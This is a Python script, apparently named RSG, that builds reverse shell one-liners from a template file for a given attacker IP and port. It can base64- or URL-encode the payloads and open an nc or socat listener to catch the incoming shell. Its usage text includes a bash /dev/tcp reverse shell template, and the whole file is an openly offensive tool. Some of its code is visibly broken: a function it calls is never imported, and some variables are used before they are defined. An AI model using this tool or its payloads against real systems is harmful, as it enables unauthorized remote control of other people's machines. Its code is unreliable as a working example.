#!/usr/bin/env python3

# from sys import argv, exit as exit_code
# from os import system, path
import os
import sys
import getopt
import re
from subprocess import check_output
import base64
import urllib.parse

global _db
_db = 'shells.db'

def GREEN(text):
    return "\033[32m{}\033[0m".format(str(text))

def usage():
    print('''
    ██████╗ ███████╗ ██████╗      ██╗ ██╗ ██╗
    ██╔══██╗██╔════╝██╔════╝     ████████╗╚██╗
    ██████╔╝███████╗██║  ███╗    ╚██╔═██╔╝ ╚██╗
    ██╔══██╗╚════██║██║   ██║    ████████╗ ██╔╝
    ██║  ██║███████║╚██████╔╝    ╚██╔═██╔╝██╔╝
    ╚═╝  ╚═╝╚══════╝ ╚═════╝      ╚═╝ ╚═╝ ╚═╝

    SYNOPSIS:
        \033[32mpython3 {} <ip address> <port> [shell type]\033[0m

      Examples:
        \033[32mpython3 {} 127.0.0.1 4444\033[0m
        \033[32mpython3 {} 192.168.0.1 443 bash\033[0m

    OPTIONS SUMMARY:
        -h,   --help          Display this help screen
        -l,   --list-type     List available types
        -v,   --verbose       Set verbosity level
        --enc-b64             Output reverse shell base64-encoded
        --enc-url             Output reverse shell percent-encoded
        --force               Force unknown IPv4s to be used
        --env                 Use prefered path rather than /bin/
        --sh                  Use sh rather than bash

      Mandatory arguments:
        -H,   --host          Specify host to use
        -P,   --port          Specify port to use
        -T,   --type          Shell type to use
        -p,   --pattern       Shell pattern to use
                                following format: "BASH|[PREFERED_SHELL] -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1"
        -a,   --add-db        Shell pattern will be added to db

    '''.format(sys.argv[0],sys.argv[0],sys.argv[0]))
    sys.exit(-1)

def list_types():
    print('[+] Handled types of Reverse Shells:')
    shells = os.path.join(os.path.dirname(os.path.realpath(__file__)), _db)
    sh_list = []
    for shell in open(shells):
        desc, junk = shell.split('|', 1)
        sh_list.append(desc)
    unique(sh_list)

def verify_ip(ipaddr):

    output = check_output(['ip', 'address']).decode()
    # candidate_ips = [ip for ip in re.findall(r"(?:\d{1,3}\.){3}\d{1,3}",output) if '255' not in ip]
    candidate_ips = grab_ip(output)

    return ipaddr in candidate_ips

def main(argv):

    list = 'all'
    port = '9001'
    host = ''
    type = ''
    # pattern = ''
    add_pattern = False
    pref_path = '/bin/'
    pref_shell = 'bash'
    use_type = False
    enc_mode = 0
    force_ip = False


    # argv = sys.argv[1:]

    if len(argv) < 2:
        usage()
    try:
        opts, args = getopt.getopt(argv, "H:P:T:p:a:hlv", ["host=", "port=", "type=", "pattern=", "add-db", "help", "list-type", "enc-b64", "enc-url", "force", "env=", "sh", "verbose"])
    except:
        print("Error Message ")
        sys.exit(2)
    for opt, arg in opts:
        if opt in ['-H', '--host']:
            host = arg
        elif opt in ['-P', '--port']:
            port = arg
        elif opt in ('-T', '--type'):
            use_type = True
            type = arg
        elif opt in ['-p', '--pattern']:
            global _pattern
            _pattern = arg
            use_pattern = True
        elif opt in ['-a', '--add-db']:
            if use_pattern == True:
                add_pattern = True
            else:
                print('ERROR. No new shell pattern to save in data file.')
                sys.exit(2)
        elif opt in ['-h', '--help']:
            usage()
            sys.exit()
        elif opt in ('-l', '--list-type'):
            list_types()
            sys.exit()
        elif opt in ('--enc-b64'):
            enc_mode = 1
        elif opt in ('--enc-url'):
            enc_mode = 2
        elif opt in ('--force'):
            force_ip = True
        elif opt in ('--env'):
            pref_path = arg
        elif opt in ('--sh'):
            pref_shell = 'sh'
        elif opt in ('-v', '--verbose'):
            global _verbose
            _verbose = 1

    print("debug args: " + type + ";" + host + ";" + port)

    # ipaddr, port = argv[1], argv[2]

    ipaddr = host

    if not test_host(ipaddr):
        print("Hostname not supported yet!")
        output = check_output(['getent', 'hosts', ipaddr]).decode()
        # candidate_ips = [ip for ip in re.findall(r"(?:\d{1,3}\.){3}\d{1,3}",output) if '255' not in ip]
        candidate_ips = grab_ip(output)

        if not len(candidate_ips) == 0:
            print(candidate_ips[0])
        else:
            output = check_output(['dig', '+short', ipaddr]).decode()
            # candidate_ips = [ip for ip in re.findall(r"(?:\d{1,3}\.){3}\d{1,3}",output) if '255' not in ip]
            candidate_ips = grab_ip(output)
            if len(candidate_ips) == 0:
                print("Can not find such hostname in any reolver")
                sys.exit(-1)
            else:
                print(candidate_ips[0])
    ipaddr = candidate_ips[0]
        #exit_code(-1)

    if not verify_ip(ipaddr):
        print("ERROR. No interface showing a class of network which IP address belongs to. Exiting.")
        sys.exit(-1)

    if (add_pattern):
        save_pattern(_pattern)

    shells = os.path.join(os.path.dirname(os.path.realpath(__file__)), _db)

    # if len(argv) == 4:
    if (use_type):
        # shell_type = argv[3].upper()
        shell_type = type.upper()
    else:
        shell_type = ''
    for shell in open(shells):
        desc, cmd = shell.split('|', 1)
        cmd = cmd.replace("[IPADDR]", ipaddr)
        cmd = cmd.replace("[PORT]", port)
        cmd = cmd.replace("[PREFERED_SHELL]", pref_shell)
        cmd = cmd.replace("[PREFERED_BIN]", pref_path)

        if shell_type in desc:
            print(GREEN("[+] " + desc))
            print(switch_enc(cmd, enc_mode))
            # print(cmd)

    c = input('Select your payload, press "l" to listen on port {} or enter to exit: '.format(port))
    if c == 'l':
        if int(port) < 1024:
            if shell_type == 'SOCAT':
                print(shell_type)
                system('sudo socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
            else:
                system('sudo nc -n -v -l -s {} -p {}'.format(ipaddr, port))
        else:
            if shell_type == 'SOCAT':
                print(shell_type)
                system('socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
            else:
                system('nc -n -v -l -s {} -p {}'.format(ipaddr, port))

def test_host(host):
    h = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    if h.match(host):
       return True
    else:
       return False

def grab_ip(input):
    candidate_ips = [ip for ip in re.findall(r"(?:\d{1,3}\.){3}\d{1,3}",input) if '255' not in ip]
    return candidate_ips

def unique(_list):
    list_set = set(_list)
    unique_list = (list(sorted(list_set)))
    for u in unique_list:
        print(GREEN(u))
    print('\n')

def switch_enc(cmd, mode):
    switcher = {
        0: cmd,
        1: base64.b64encode(cmd.encode()),
        2: urllib.parse.quote_plus(cmd)
    }
    return switcher.get(mode, cmd)

def save_pattern(pattern):
    with open(_db, 'a+') as db_file:
        # Move read cursor to the start of file.
        db_file.seek(0)
        # If file is not empty then append '\n'
        data = db_file.read(100)
        if len(data) > 0 :
            db_file.write("\n")
        db_file.write(pattern)
        print(GREEN('[+] INFO. New pattern saved to data file.'))


if __name__ == "__main__":
    main(sys.argv[1:])
